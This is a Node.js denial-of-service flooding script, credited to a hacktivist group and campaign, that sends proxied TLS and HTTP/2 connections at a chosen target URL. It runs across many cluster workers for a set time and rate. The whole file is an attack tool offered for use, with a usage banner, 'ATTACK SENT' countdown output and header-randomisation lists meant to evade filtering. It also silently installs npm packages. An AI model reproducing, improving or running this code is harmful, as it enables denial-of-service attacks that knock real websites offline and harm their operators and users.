// Import required modules
const requiredModules = [
  "colors", 'http2', "tls", "cluster", 'set-cookie-parser',
  "url", "crypto", "user-agents", "random-useragent", "net", 'fs'
];

// Check if required modules are installed, if not, install them
requiredModules.forEach(moduleName => {
  try {
    require.resolve(moduleName);
  } catch (error) {
    console.log("Installing the module " + moduleName + "...");
    const { execSync } = require("child_process");
    execSync("npm install " + moduleName);
  }
});

// Import required modules
const net = require('net');
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require('fs');
const colors = require("colors");
const randomUseragent = require("random-useragent");

// Set up some data arrays
const userAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9", "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240", "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62", "Mozilla/5.0 (Linux; Android 12; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 8.1.0; W-K130-TMV Build/OPM2.171019.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 4.4.2; MITO T10 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; moto g(7) plus Build/QPWS30.61-21-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 9; SM-G800H Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.114 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 9; TECNO AB7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (Linux; 6.0; Nomi i5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; SAMSUNG moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36", "Mozilla/5.0 (Linux; U; Android 3.2; en-us; Sony Tablet S Build/THMAS11000) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13", "Mozilla/5.0 (Linux; Android 7.1.1; SM-J510MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.2.3381.61420", "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.69 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.5615.46 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 11; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4504021560267656607 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5534684115277472898 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0", "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"];
const acceptHeaders = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"];
const cacheHeaders = ["max-age=0", "no-cache", "no-store", "pre-check=0", 'post-check=0', "must-revalidate", "proxy-revalidate", "s-maxage=604800", "no-cache, no-store,private, max-age=0, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "no-cache, no-store,private, max-age=604800, must-revalidate"];
const generateEncoding = ['*', "gzip, deflate", "br;q=1.0, gzip;q=0.8, *;q=0.1", "gzip", "gzip, compress", "compress, deflate", 'compress', "gzip, deflate, br", "deflate"];
const languageHeaders = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", 'de-CH;q=0.7', "da, en-gb;q=0.8, en;q=0.7", 'cs;q=0.5', "nl-NL,nl;q=0.9", "nn-NO,nn;q=0.9", "or-IN,or;q=0.9", "pa-IN,pa;q=0.9", "pl-PL,pl;q=0.9", 'pt-BR,pt;q=0.9', "pt-PT,pt;q=0.9", "ro-RO,ro;q=0.9", "ru-RU,ru;q=0.9", 'si-LK,si;q=0.9', "sk-SK,sk;q=0.9", "sl-SI,sl;q=0.9", 'sq-AL,sq;q=0.9', 'sr-Cyrl-RS,sr;q=0.9', 'sr-Latn-RS,sr;q=0.9', "sv-SE,sv;q=0.9", "sw-KE,sw;q=0.9", "ta-IN,ta;q=0.9", 'te-IN,te;q=0.9', 'th-TH,th;q=0.9', 'tr-TR,tr;q=0.9', "uk-UA,uk;q=0.9", "ur-PK,ur;q=0.9", "uz-Latn-UZ,uz;q=0.9", "vi-VN,vi;q=0.9", "zh-CN,zh;q=0.9", "zh-HK,zh;q=0.9", 'zh-TW,zh;q=0.9', 'am-ET,am;q=0.8', "as-IN,as;q=0.8", "az-Cyrl-AZ,az;q=0.8", "bn-BD,bn;q=0.8", "bs-Cyrl-BA,bs;q=0.8", 'bs-Latn-BA,bs;q=0.8', "dz-BT,dz;q=0.8", "fil-PH,fil;q=0.8", "fr-CA,fr;q=0.8", 'fr-CH,fr;q=0.8', "fr-BE,fr;q=0.8", "fr-LU,fr;q=0.8", "gsw-CH,gsw;q=0.8", "ha-Latn-NG,ha;q=0.8", "hr-BA,hr;q=0.8", "ig-NG,ig;q=0.8", "ii-CN,ii;q=0.8", 'is-IS,is;q=0.8', "jv-Latn-ID,jv;q=0.8", 'ka-GE,ka;q=0.8', "kkj-CM,kkj;q=0.8", 'kl-GL,kl;q=0.8', "km-KH,km;q=0.8", 'kok-IN,kok;q=0.8', "ks-Arab-IN,ks;q=0.8", "lb-LU,lb;q=0.8", "ln-CG,ln;q=0.8", 'mn-Mong-CN,mn;q=0.8', "mr-MN,mr;q=0.8", "ms-BN,ms;q=0.8", "mt-MT,mt;q=0.8", "mua-CM,mua;q=0.8", "nds-DE,nds;q=0.8", "ne-IN,ne;q=0.8", 'nso-ZA,nso;q=0.8', "oc-FR,oc;q=0.8", "pa-Arab-PK,pa;q=0.8", 'ps-AF,ps;q=0.8', "quz-BO,quz;q=0.8", "quz-EC,quz;q=0.8", "quz-PE,quz;q=0.8", "rm-CH,rm;q=0.8", 'rw-RW,rw;q=0.8', "sd-Arab-PK,sd;q=0.8", "se-NO,se;q=0.8", "si-LK,si;q=0.8", 'smn-FI,smn;q=0.8', "sms-FI,sms;q=0.8", "syr-SY,syr;q=0.8", "tg-Cyrl-TJ,tg;q=0.8", 'ti-ER,ti;q=0.8', "tk-TM,tk;q=0.8", "tn-ZA,tn;q=0.8", "tt-RU,tt;q=0.8", "ug-CN,ug;q=0.8", "uz-Cyrl-UZ,uz;q=0.8", 've-ZA,ve;q=0.8', 'wo-SN,wo;q=0.8', "xh-ZA,xh;q=0.8", "yo-NG,yo;q=0.8", "zgh-MA,zgh;q=0.8", "zu-ZA,zu;q=0.8"];
const destinationHeaders = ['audio', 'audioworklet', "document", 'embed', "empty", "font", "frame", 'iframe', 'image', "manifest", "object", 'paintworklet', "report", "script", "serviceworker", "sharedworker", "style", "track", 'video', "worker", "xslt"];
const platforms = ["Windows", 'Linux', 'iPhone'];
const modeHeaders = ["cors", "navigate", 'no-cors', "same-origin", "websocket"];
const siteHeaders = ["cross-site", "same-origin", "same-site", "none"];
const secChUa = ["\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"", "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Brave\";v=\"114\""];

process.setMaxListeners(0x0);
require("events").EventEmitter.defaultMaxListeners = 0x0;

// Set up some constants and secure options
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':');
const ciphers = "GREASE:" + [defaultCiphers[0x2], defaultCiphers[0x1], defaultCiphers[0x0], ...defaultCiphers.slice(0x3)].join(':');
const sigalgs = ["ecdsa_secp256r1_sha256", "ecdsa_secp384r1_sha384", "ecdsa_secp521r1_sha512", "rsa_pss_rsae_sha256", "rsa_pss_rsae_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha256", "rsa_pkcs1_sha384", "rsa_pkcs1_sha512"];
let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519";
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
const secureProtocol = "TLS_client_method";
const headers = {};
const secureContextOptions = {
  'ciphers': ciphers,
  'sigalgs': SignalsList,
  'honorCipherOrder': true,
  'secureOptions': secureOptions,
  'secureProtocol': secureProtocol
};
const secureContext = tls.createSecureContext(secureContextOptions);

// Help Message
function printHelp() {
  console.log("Usage: node w00t.js <target> <time> <rate> <threads> <method> <proxyFile>");
  console.log("\nOptions:");
  console.log("  <target>      Target URL or IP address (eg: https://example.com)");
  console.log("  <time>        Duration of the attack in seconds");
  console.log("  <rate>        Requests per second");
  console.log("  <threads>     Number of threads");
  console.log("  <method>      Attack method (GET, POST, HEAD, CONNECT, PUT, OPTIONS, TRACE, PATCH, DELETE)");
  console.log("  <proxyFile>   Path to the file containing proxy list");
}

// Parse command line arguments
const args = {
  target: process.argv[2],
  time: parseInt(process.argv[3]),
  rate: parseInt(process.argv[4]),
  threads: parseInt(process.argv[5]),
  method: parseInt(process.argv[6]),
  proxyFile: process.argv[7]
};

if (process.argv.length < 0x7) {
  printHelp();
  process.exit(1);
}

// Read proxy data from a file
const proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);

// Parse the target URL
const parsedTarget = url.parse(args.target);

// Check if this is the master cluster process
const timeRemaining = args.time;
let currentTime = timeRemaining;

const countdownInterval = setInterval(() => {
    currentTime--;
    console.clear();
    // Clear the line and move the cursor to the beginning
    process.stdout.write('\x1B[2K\x1B[0E');
    
    console.log(`          ██████╗░██████╗░░█████╗░░██████╗░░█████╗░███╗░░██╗███████╗░█████╗░██████╗░░█████╗░███████╗
          ██╔══██╗██╔══██╗██╔══██╗██╔════╝░██╔══██╗████╗░██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
          ██║░░██║██████╔╝███████║██║░░██╗░██║░░██║██╔██╗██║█████╗░░██║░░██║██████╔╝██║░░╚═╝█████╗░░
          ██║░░██║██╔══██╗██╔══██║██║░░╚██╗██║░░██║██║╚████║██╔══╝░░██║░░██║██╔══██╗██║░░██╗██╔══╝░░
          ██████╔╝██║░░██║██║░░██║╚██████╔╝╚█████╔╝██║░╚███║██║░░░░░╚█████╔╝██║░░██║╚█████╔╝███████╗
          ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░░╚════╝░╚═╝░░╚══╝╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░╚════╝░╚══════╝`.red)
    console.log(`                                  ATTACK SENT - Time Remaining: ${currentTime} seconds                                             `.bgRed);
    console.log('            Recoded by @Vip3rLi0n'.blue, ' | ', 'Copyright @Dragonforce.io / Nusantara'.red, ' | ', 'Made for #OpsBadai'.yellow);

    if (currentTime <= 0) {
        clearInterval(countdownInterval);
        console.log('Attack Completed!'.green);
        process.exit(0);
    }
}, 2000);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    for (let i = 0; i < 10; i++) {
        setInterval(runFlooder, 0);
    }
}

// Class to handle network sockets
class NetSocket {
  constructor() {}

  // Function to handle HTTP requests
  HTTP(params, callback) {
    const request = "CONNECT " + params.address + ":443 HTTP/1.1\r\nHost: " + params.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const requestBuffer = new Buffer.from(request);
    const socket = net.connect({
      host: params.host,
      port: params.port,
      allowHalfOpen: true,
      writable: true,
      readable: true
    });
    socket.setTimeout(params.timeout * 60000);
    socket.setKeepAlive(true, 60000);
    socket.setNoDelay(true);

    socket.on("connect", () => {
      socket.write(requestBuffer);
    });

    socket.on('data', data => {
      const response = data.toString("utf-8");
      const isSuccessful = response.includes("HTTP/1.1 200");
      if (!isSuccessful) {
        socket.destroy();
        return callback(undefined, "403");
      }
      return callback(socket, undefined);
    });

    socket.on("timeout", () => {
      socket.destroy();
      return callback(undefined, "403");
    });

    socket.on("error", error => {
      socket.destroy();
      return callback(undefined, "403");
    });
  }
}

function generateCookieString(cookies) {
    let cookieString = '';
    for (const cookie of cookies) {
      cookieString += ` ${cookie.name}=${cookie.value};`;
    }
    cookieString = cookieString.substring(1);
    return cookieString.substring(0, cookieString.length - 1);
  }
  
  const socket = new NetSocket();
  
  function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
  }
  
  function getRandomIntInRange(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
  }
  
  function getRandomElement(array) {
    return array[Math.floor(Math.random() * array.length)];
  }
  
  function generateRandomUserAgent() {
    const operatingSystems = ["Windows", "Windows NT 10.0", "Windows NT 6.1", "Windows NT 6.3", 'Macintosh', "Android", 'Linux'];
    const browsers = ["Chrome", "Firefox", "Safari", "Edge", "Opera"];
    const languages = ["en-US", 'en-GB', "fr-FR", "de-DE", "es-ES"];
    const countries = ['US', 'GB', 'FR', 'DE', 'ES'];
    const vendors = ["Windows", "Apple", "Google", "Microsoft", "Mozilla", "Opera Software"];
  
    const os = operatingSystems[Math.floor(Math.random() * operatingSystems.length)];
    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    const language = languages[Math.floor(Math.random() * languages.length)];
    const country = countries[Math.floor(Math.random() * countries.length)];
    const vendor = vendors[Math.floor(Math.random() * vendors.length)];
  
    const majorVersion = Math.floor(Math.random() * 100) + 1;
    const minorVersion = Math.floor(Math.random() * 6) + 1;
  
    const userAgent = `${vendor}/${browser} ${majorVersion}.${minorVersion}.${majorVersion} (${os}; ${country}; ${language})`;
    const encodedUserAgent = btoa(userAgent);
  
    let modifiedUserAgent = '';
    for (let i = 0; i < encodedUserAgent.length; i++) {
      if (i % minorVersion === 0) {
        modifiedUserAgent += encodedUserAgent.charAt(i);
      } else {
        modifiedUserAgent += encodedUserAgent.charAt(i).toUpperCase();
      }
    }
    return modifiedUserAgent;
  }
  
  function runFlooder() {
    const randomProxy = proxies[Math.floor(Math.random() * proxies.length)];
    const proxyParts = randomProxy.split(':');
    const port = parsedTarget.protocol == "https:" ? '443' : '80';

    const proxySettings = {
        'host': proxyParts[0],
        'port': ~~proxyParts[1],
        'address': `${parsedTarget.host}:443`,
        'timeout': 100
    };

    socket.HTTP(proxySettings, (error, response) => {
        if (response) {
            return;
        }

        error.setKeepAlive(true, 100000);
        error.setNoDelay(true);

        const connectionOptions = {
            'enablePush': false,
            'initialWindowSize': 1073741823
        };

        const secureOptions = {
            'port': port,
            'secure': true,
            'ALPNProtocols': ['h2', 'spdy/3.1', "http/1.1"],
            'ciphers': ciphers,
            'sigalgs': sigalgs,
            'requestCert': true,
            'socket': error,
            'ecdhCurve': "GREASE:X25519:x25519",
            'honorCipherOrder': false,
            'host': parsedTarget.host,
            'rejectUnauthorized': false,
            'clientCertEngine': "dynamic",
            'secureContext': secureContext,
            'servername': parsedTarget.host,
            'secureProtocol': "TLS_client_method"
            // Remove the following line, as it causes the ReferenceError
            // 'secureOptions': secureOptions,
        };

        const tlsConnection = tls.connect(port, parsedTarget.host, secureOptions);
        tlsConnection.allowHalfOpen = true;
        tlsConnection.setNoDelay(true);
        tlsConnection.setKeepAlive(true, 6000000);
        tlsConnection.setMaxListeners(0);

        const http2Connection = http2.connect(parsedTarget.href, {
            'protocol': "https:",
            'settings': {
                'headerTableSize': 65536,
                'maxConcurrentStreams': 1000,
                'initialWindowSize': 6291456,
                'maxHeaderListSize': 262144,
                'enablePush': false
            },
            'maxSessionMemory': 33477,
            'maxDeflateDynamicTableSize': 4294967295,
            'createConnection': () => tlsConnection,
            'socket': error
        });

        http2Connection.settings({
            'headerTableSize': 65536,
            'maxConcurrentStreams': 1000,
            'initialWindowSize': 6291456,
            'maxHeaderListSize': 262144,
            'enablePush': false
        });

        http2Connection.setMaxListeners(0);

        http2Connection.settings(connectionOptions);

        http2Connection.on('connect', () => {});
        http2Connection.on("close", () => {
            http2Connection.destroy();
            error.destroy();
            return;
        });

        http2Connection.on('error', (err) => {
            http2Connection.destroy();
            error.destroy();
            return;
        });
    });
  }

  
  const stopScript = () => process.exit(1);
  setTimeout(stopScript, args.time * 1000);